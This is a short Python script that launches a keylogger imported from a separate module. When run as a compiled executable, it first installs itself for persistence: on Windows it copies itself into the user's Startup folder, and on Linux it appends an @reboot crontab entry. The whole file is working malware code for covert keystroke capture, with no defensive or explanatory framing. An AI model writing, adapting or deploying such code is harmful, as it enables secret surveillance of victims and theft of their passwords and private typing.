import platform
import time
import os
import sys
import shutil
from keylogger import KeyLogger

if getattr(sys, 'frozen', False):
	# compiled file.exe can find itself by
	file_name = os.path.basename(sys.executable)

	# and path to py or exe
	current_path = os.path.dirname(sys.executable)
	if platform.system() == "Windows":
		# startup folder for user
		startup_folder_win = os.path.join(os.getenv("appdata"),"Microsoft","Windows","Start Menu","Programs","Startup")

		if current_path != startup_folder_win:
			shutil.copy2(os.path.realpath(sys.executable), startup_folder_win)
	else: # Assume linux
		added = os.system(f"crontab -l | grep {file_name}") == 0 # check if already moved to startup
		if not added:
			print(os.system(f'crontab -l > file; echo "@reboot sleep 10; DISPLAY=":0" {os.path.realpath(sys.executable)} >/tmp/move_to_startup.log 2>&1" >> file; crontab file; rm file;'))

else:
    print("Running in dev mode... not moving to startup")

KeyLogger(10)
